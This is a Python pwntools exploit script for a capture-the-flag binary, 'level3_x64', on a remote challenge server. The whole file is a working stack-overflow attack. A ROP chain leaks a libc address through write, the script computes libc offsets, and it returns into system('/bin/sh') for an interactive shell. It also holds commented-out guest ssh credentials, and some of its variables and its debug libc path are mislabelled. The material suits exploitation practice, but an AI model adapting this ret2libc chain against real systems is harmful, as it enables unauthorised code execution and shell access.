#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *

DEBUG = False
#context.log_level = "debug"
if DEBUG:
	io = process("./level3_x64")
	level3 = ELF("./level3_x64")
	libc = ELF("/lib64/ld-linux-x86-64.so.2")
else:
	"""s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )"""
	io = remote("pwn2.jarvisoj.com","9883")
	level3 = ELF("./level3_x64")
	libc = ELF("./libc-2.19.so")
#gdb.attach(io)
#context.log_level = "debug"
write_plt = 0x00000000004004b0
poppoppop_ebx = 0x00000000004006ae
vunlu_addr = 0x00000000004005e6
pop_rdi = 0x00000000004006b3
poppop_rsi = 0x00000000004006b1
payload = ""
payload += 0x80*"A"
payload += "junkjunk"
#payload += p64(write_plt)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(poppop_rsi)
payload += p64(level3.got["__libc_start_main"])
payload += "junkjunk"
payload += p64(write_plt)
payload += p64(vunlu_addr)
io.sendline(payload)
io.recvuntil("Input:\n")
#print io.recv().strip("Input:\n")
write_got = u64(io.recv().strip("Input:\n")[0:8])
print hex(write_got)
system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
write = libc.symbols["__libc_start_main"]
libc_base = write_got - write
system_got = libc_base + system
binsh_got = libc_base + binsh
payload = ""
payload += 0x80*"A"
payload += "junkjunk"
payload += p64(pop_rdi)
payload += p64(binsh_got)
payload += p64(system_got)
io.sendline(payload)
io.interactive()
